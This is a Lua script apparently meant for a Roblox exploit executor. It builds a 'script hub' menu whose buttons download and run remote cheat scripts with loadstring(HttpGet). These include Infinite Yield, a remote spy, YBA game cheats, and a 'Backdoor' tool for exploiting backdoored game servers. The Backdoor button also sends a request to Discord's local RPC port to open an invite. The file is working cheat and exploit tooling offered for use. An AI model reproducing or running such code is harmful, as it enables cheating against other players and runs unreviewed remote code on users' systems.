	local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

		local Window = Rayfield:CreateWindow({
		Name = "AlexMiles Script Hub V0.1",
		LoadingTitle = "Loading...",
		LoadingSubtitle = "by AlexMiles | _alexmiles_",
		ConfigurationSaving = {
			Enabled = true,
			FolderName = nil, -- Create a custom folder for your hub/game
			FileName = "AlexMilesHub"
		},
		Discord = {
			Enabled = false,
			Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
			RememberJoins = true -- Set this to false to make them join the discord every time they load it up
		},
		KeySystem = false, -- Set this to true to use our key system
		KeySettings = {
			Title = "Untitled",
			Subtitle = "Key System",
			Note = "No method of obtaining the key is provided",
			FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
			SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
			GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
			Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
		}
	})


	-- Main
	local MainTab = Window:CreateTab("Some Scripts", 4483362458) -- Title, Image
	local MainSection = MainTab:CreateSection("Scripts here:")
	local Label = MainTab:CreateLabel("Universal:")
	local Button = MainTab:CreateButton({
	Name = "NotifyTest",
	Callback = function()
			Rayfield:Notify({
		Title = "Notify Test",
		Content = "Thats works!",
		Duration = 6.5,
		Image = 4483362458,
		Actions = { -- Notification Buttons
			Ignore = {
				Name = "Okay!",
				Callback = function()
				print("The user tapped Okay!")
		end
	},
	},
	})
	end,
	})


	-- Infinite Yeld

	local IEButton = MainTab:CreateButton({
	Name = "Infinitie Yeld",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	end,
	})

	-- Remote Spy (https://raw.githubusercontent.com/GameGuyThrowaway/RemoteSpy/main/scriptBeta.lua)

	local RemoteSpyButton = MainTab:CreateButton({
	Name = "Remote Spy (Synapse)",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/GameGuyThrowaway/RemoteSpy/main/scriptBeta.lua'))()
	end,
	})

	local Label = MainTab:CreateLabel("Yba:")

	local BeachBoyv3Button = MainTab:CreateButton({
	Name = "Beach BoyV3",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/zakater5/LuaRepo/main/YBA/v3.lua"))()
	end,
	})

	local YbaCuzYesButton = MainTab:CreateButton({
	Name = "YbaCuzYes",
	Callback = function()
		loadstring(game:HttpGet"https://raw.githubusercontent.com/NukeVsCity/hackscript123/main/gui")()
	end,
	})
	
	-- Other

	local Other = MainTab:CreateLabel("Other: ")

	local BackdoorButton = MainTab:CreateButton({
	Name = "Backdoor",
	Callback = function()
				local httpService = game:GetService("HttpService");

		local invCode = "xJHCqm84cW";
		local httpRequest = (syn and syn.request) or http_request or function() end;

		local function launchDiscord()
			if not httpRequest then warn("Exploit not supported. No HTTP found.") return end
			
			httpRequest({
				Url = "http://127.0.0.1:6463/rpc?v=1",
				Method = "POST",
			
				Headers = {
					['Content-Type'] = 'application/json',
					Origin = 'https://discord.com'
				},
			
				Body = httpService:JSONEncode({
					cmd = 'INVITE_BROWSER',
					nonce = httpService:GenerateGUID(false),
					args = {code = invCode}
				})
			})
		end;

		local NotificationBindable = Instance.new("BindableFunction")
		NotificationBindable.OnInvoke = launchDiscord

		game:GetService("StarterGui"):SetCore(
			"SendNotification",
			{
				Title = "backdoor.exe",
				Duration = 5,
				Text = "Loading lastest version!\n\nJoin our Discord for games, scripts and more",
				Button1 = "Join Discord!",
				Callback = NotificationBindable
			}
		)

		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();



		--	k4scripts
		--	.------.
		--	|4.--. |
		--	| :│/: |
		--	| :│\: |
		--	| '--'4|
		--	`------'


	end,
	})

	-- CuHub

	-- Other Hubs

	local HubsTab = Window:CreateTab("Other Hubs", 4483362458) -- Title, Image
	local HubsSection = HubsTab:CreateSection("Hubs:")
	local PendButton = HubsTab:CreateButton({
	Name = "Pendulum Hub",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/AlexMiles22815/AlexMilesHub/main/Pendulum%20Hub.lua'))()
	end,
	})
	local CuHubButton = HubsTab:CreateButton({
	Name = "CuHub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ItachiPvPUchiha/CuHub/main/yba.lua"))()
	end,
	})

	-- info

	local InfoTab = Window:CreateTab("Info", 4483362458) -- Title, Image
	local InfoSection = InfoTab:CreateSection("Info:")

	local Label = InfoTab:CreateLabel("Version: v0.1")


	
